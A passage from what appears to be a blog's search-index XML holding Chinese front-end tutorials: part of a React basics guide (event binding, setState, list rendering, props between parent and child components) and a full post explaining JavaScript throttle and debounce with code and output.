class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      ... ...</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">value</span>=<span class="string">&#123;this.state.inputValue&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onChange</span>=<span class="string">&#123;this.handleInputChange&#125;</span> &#123;/*绑定事件*/&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      /&gt;</span></span></span><br><span class="line"><span class="language-xml">      ... ...</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">handleInputChange</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>.<span class="property">value</span>);</span><br><span class="line">  <span class="comment">// `e.target.value` 为获取输入的新内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>以 <code>handleInputChange</code> 方法为入口，调用 <code>setState()</code> 方法更改<code>state</code>中的数据</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      ...</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">value</span>=<span class="string">&#123;this.state.inputValue&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onChange</span>=<span class="string">&#123;this.handleInputChange.bind(this)&#125;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &#123;/* </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">1.</span> 在<span class="attr">javascript</span>中，类方法没有指定<span class="attr">this</span>，所以使用<span class="attr">onChange</span>触发的放法中的<span class="attr">this</span>为<span class="attr">undefined</span>。</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">2.</span> 使用<span class="attr">bind</span>绑定 <span class="attr">handleInputChange</span> 方法 <span class="attr">this</span> 的指向为 <span class="attr">TodoList</span> 类。</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">3.</span> 使用 <span class="attr">onChange</span>=<span class="string">&#123;(e)</span> =&gt;</span> &#123; this.handleInputChange(e) &#125;&#125; （需要再此传入合成的事件e）也可以达到同样的效果</span></span><br><span class="line"><span class="language-xml">        */&#125;</span></span><br><span class="line"><span class="language-xml">      /&gt;</span></span><br><span class="line"><span class="language-xml">      ...</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">handleInputChange</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">    <span class="attr">inputValue</span>: e.<span class="property">target</span>.<span class="property">value</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>this指向问题：我们用 <code>this.[METHODS].bind(this)</code> 能解决 [METHODS] 函数中 this 的指向问题，但是这会造成性能上的影响。更优的解决方案是在 <code>constructor</code> 部分中添加一个 <code>this.[METHODS] = this.[METHODS].bind(this)</code>，这样性能就会被优化。</p></blockquote><blockquote><p>在新版的React中 <code>this.setState</code> 推荐改写为传入一个方法，这个方法返回的是一个state对象，如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> value = e.<span class="property">target</span>.<span class="property">value</span> <span class="comment">// 新版的方法会将setState方法改写为异步，所以要再此保存状态</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (&#123;</span><br><span class="line">    <span class="attr">inputValue</span>: value</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// ES6可以简写为：</span></span><br><span class="line"><span class="keyword">const</span> value = e.<span class="property">target</span>.<span class="property">value</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function">()=&gt;</span>(&#123; </span><br><span class="line">  <span class="comment">// 剪头函数后面直接跟一个括号，这个括号内的内容即为返回的内容</span></span><br><span class="line">  <span class="attr">inputValue</span>: value</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><h2 id="7-渲染数据-循环渲染"><a href="#7-渲染数据-循环渲染" class="headerlink" title="7.渲染数据 (循环渲染)"></a>7.渲染数据 (循环渲染)</h2><blockquote><p><code>this.state.[LIST].map</code> 效果相当于 Vue 中的 <code>v-for</code></p></blockquote><p>用<code>&#123;&#125;</code>包住的是js语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(props);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">    <span class="attr">list</span>: [<span class="string">&quot;11&quot;</span>,<span class="string">&quot;22&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;</span></span><br><span class="line"><span class="language-xml">      this.state.list.map((item, index) =&gt; &#123;</span></span><br><span class="line"><span class="language-xml">        return <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#125;)</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="ES6展开运算符："><a href="#ES6展开运算符：" class="headerlink" title="ES6展开运算符："></a>ES6展开运算符：</h3><blockquote><p>假如已定义一个数组 <code>let arr = [1,2,3]</code>  </p><p><code>[...arr]</code> 表示为 <code>[1,2,3]</code></p><p>我们可以对其进行操作连接赋值操作，如：</p><p><code>let arr2 = [...arr,4,5]</code></p><p>那么，<code>arr2</code>被输出后即为<code>[1,2,3,4,5]</code></p></blockquote><h2 id="8-class属性的处理"><a href="#8-class属性的处理" class="headerlink" title="8.class属性的处理"></a>8.class属性的处理</h2><p>用<code>className</code>替代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input</span><br><span class="line">+ className=&quot;input&quot;</span><br><span class="line">  value=&#123;this.state.inputValue&#125;</span><br><span class="line">  onChange=&#123;this.handleInputChange.bind(this)&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><h2 id="9-不转义字符串"><a href="#9-不转义字符串" class="headerlink" title="9.不转义字符串"></a>9.不转义字符串</h2><p><code>dangerouslySetInnerHTML</code> 取消转义内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  &#123;</span><br><span class="line">    this.state.list.map((item, index) =&gt; &#123;</span><br><span class="line">      return &lt;li</span><br><span class="line">        key=&#123;index&#125;</span><br><span class="line">        onClick=&#123;this.handleDelete.bind(this, index)&#125;</span><br><span class="line">+       dangerouslySetInnerHTML=&#123;&#123;__html: item&#125;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">      &#123;/*注意中间不能有内容*/&#125;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><h2 id="10-for属性的处理"><a href="#10-for属性的处理" class="headerlink" title="10.for属性的处理"></a>10.for属性的处理</h2><p>用<code>htmlFor</code>替代</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;label htmlFor=<span class="string">&quot;insertArea&quot;</span>&gt;&lt;/label&gt;</span><br></pre></td></tr></table></figure><h2 id="11-父组件与子组件"><a href="#11-父组件与子组件" class="headerlink" title="11.父组件与子组件"></a>11.父组件与子组件</h2><ol><li><p>父组件中使用子组件：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在TodoList.js中引入TodoItem.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">TodoItem</span> <span class="keyword">from</span> <span class="string">&#x27;./TodoItem&#x27;</span></span><br><span class="line">...</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">list</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">TodoItem</span> /&gt;</span> </span></span><br><span class="line"><span class="language-xml">        &#123;/* 在TodoList.js中要调用TodoItem组件的位置用一个 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoItem.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TodoItem</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">TodoItem</span>;</span><br></pre></td></tr></table></figure></li><li><p>父组件向子组件传值：父组件以标签属性的方式，向子组件传入值。如下，父组件为子组件设置一个 <code>content</code> 属性，属性的值为父组件的 <code>item</code> 的值：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// TodoList.js</span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">TodoItem</span> <span class="attr">content</span>=<span class="string">&#123;item&#125;/</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>子组件通过 <code>this.props.[PROPS_NAME]</code> 来接收数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;this.props.content&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>父组件向子组件传递父组件的方法(子组件内部触发父组件的方法)：</p></li></ol><ul><li>用属性传递的方法将函数传递给子组件，同时强行将父组件中的this传递给子组件。 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- TodoList中调用TodoItem组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TodoItem</span> </span></span><br><span class="line"><span class="tag">+ <span class="attr">deleteItem</span> = <span class="string">&#123;this.handleDelete.bind(this)&#125;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoItem.js ...</span></span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; index,content &#125; = <span class="variable language_">this</span>.<span class="property">props</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">key</span>=<span class="string">&#123;index&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    &gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;content&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; index, deleteItem &#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">  <span class="title function_">deleteItem</span>(index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></li><li>在子组件中使用父组件的方法，同时this指向没问题</li></ul><h2 id="12-通过ES6语法引入props"><a href="#12-通过ES6语法引入props" class="headerlink" title="12. 通过ES6语法引入props"></a>12. 通过ES6语法引入props</h2><blockquote><p>组件的 this.props 是一个聚合属性，我们可以用ES6的解构赋值来取这些属性到一个变量中</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; index &#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">index</span>;</span><br></pre></td></tr></table></figure><h2 id="13-关于bind与this指向的问题"><a href="#13-关于bind与this指向的问题" class="headerlink" title="13. 关于bind与this指向的问题"></a>13. 关于bind与this指向的问题</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&#123;this.state.inputValue&#125;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onChange</span>=<span class="string">&#123;this.handleInputChange.bind(this)&#125;</span> </span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>在javascript中，类方法没有指定this，所以使用onChange触发的放法中的this为undefined。</p></li><li><p>使用bind绑定 handleInputChange 方法 this 的指向为 TodoList 类。</p></li><li><p>使用 onChange={(e) =&gt; { this.handleInputChange(e) }} （需要再此传入合成的事件e）也可以达到同样的效果</p></li><li><p>JSX在类方法方法中调用组件中的方法，如果带括号方法会在Virtual DOM渲染过 程中就执行，如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onClick=&#123;this.handleDeleteItem()&#125;</span><br></pre></td></tr></table></figure><p> 是不可行的，但是通过bind方法绑定this和参数后在渲染过程中不会立即执行，如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onClick=&#123;this.handleDeleteItem.bind(this, index)&#125;</span><br></pre></td></tr></table></figure><p> 但是假如方法已经在<code>constructor</code>中绑定了this，同时方法还需要传入参数，这时候不能直接使用</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onClick=&#123;this.handleDeleteItem(index)&#125; </span><br></pre></td></tr></table></figure><p> 而需要通过剪头函数来传递参数，这时绑定this是非必要的：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onClick=&#123;() =&gt; &#123;this.handleDeleteItem(index)&#125;&#125; </span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React基础教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript中的函数节流与函数防抖</title>
      <link href="/2019/04/4d0ea98eafbd.html"/>
      <url>/2019/04/4d0ea98eafbd.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>函数节流和函数防抖都是用来优化性能，以及避免短时间内连续调用某个函数的方案。我们通过以下两个例子，来理解两种方案，以及它们的应用场景。</p></blockquote><h1 id="函数节流"><a href="#函数节流" class="headerlink" title="函数节流"></a>函数节流</h1><p>函数节流即为，一个函数执行一次后，只有大于设定的执行周期后，才会执行第二次。</p><p>这里我们可以理解为当一个函数立即执行后，它需要一个冷却时间才能被执行第二次，也就是我们需要去节制函数的调用次数，即为节流。</p><p>我们可以通过检测两次函数调用的时间差，如果在设定的函数冷却时间之内，则不能执行，如果在冷却时间之外则可以执行。通过函数节流可以优化Javascript的性能，防止一个函数被无差别的多次反复执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JS核心/01.js</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数节流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fn 要被节流的函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> delay 规定的时间（函数执行的冷却时间）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, delay</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> lastTime = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 需要通过闭包来保存lastTime的状态，否则每次调用lastTime都会被初始化为0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> nowTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">if</span> (nowTime - lastTime &gt; delay) &#123;</span><br><span class="line">      fn.<span class="title function_">call</span>(<span class="variable language_">this</span>); <span class="comment">// 解决fn函数内this指向问题，如果不绑定this，函数的调用者为window（因为在这里执行函数函数前没有执行者），如果绑定了this，函数的this就指向了调用者本身</span></span><br><span class="line">      lastTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fun = <span class="title function_">throttle</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;触发了！&quot;</span>);</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">fun</span>();</span><br><span class="line">&#125;, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">fun</span>();</span><br><span class="line">&#125;, <span class="number">600</span>)</span><br></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">触发了！</span><br><span class="line">触发了！</span><br></pre></td></tr></table></figure><h1 id="函数防抖"><a href="#函数防抖" class="headerlink" title="函数防抖"></a>函数防抖</h1><p>函数防抖即为，一个需要频繁触发的函数，在规定时间内，只让最后一次生效，前面的不生效。</p><p>也就是说说一个方法将执行时，它会在一段时间内等待有没有事件第二次触发这个方法，如果有它就不执行了，如果没有才执行。</p><p>我们可以通过定时器，在方法第一次调用时，设置一个定时器，然后触发方法，假如在方法被触发前，该方法又被调用了，那在第二次调用前，会清除第一次调用方法而生成的定时器，重新再生成一个定时器去执行方法。</p><p>当我们页面上有一个按钮，希望用户在多次快速点击按钮时，仅触发一次按钮效果，我们就可以使用函数防抖机制，来避免用户在快速点击按钮时，连续触发多次方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数防抖</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fn 添加防抖的函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> delay 防抖间隔时间</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, delay</span>) &#123;</span><br><span class="line">  <span class="comment">// 记录上一次的延时器</span></span><br><span class="line">  <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 清除上一次的延时器</span></span><br><span class="line">    <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    <span class="comment">// 获取传入方法内部的参数</span></span><br><span class="line">    <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">    <span class="comment">// 重新设定新的延时器</span></span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fun = <span class="title function_">debounce</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发了！&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">fun</span>()</span><br><span class="line">&#125;, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">fun</span>()</span><br><span class="line">&#125;, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">fun</span>()</span><br><span class="line">&#125;, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">fun</span>(<span class="number">111</span>, <span class="number">222</span>)</span><br><span class="line">&#125;, <span class="number">1402</span>)</span><br></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">触发了！</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">触发了！</span><br></pre></td></tr></table></figure><h1 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h1><p>函数节流是给函数执行设定一个冷却时间，函数被触发后在某固定一时间段内无法被触发第二次，它响应第一个触发者而忽略后面的触发者。</p><p>函数防抖是推迟了函数的执行，只响应后面的触发者，而抛弃前面的触发者，它的执行时间可以被无限推迟。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome配置SwitchyOmega指南</title>
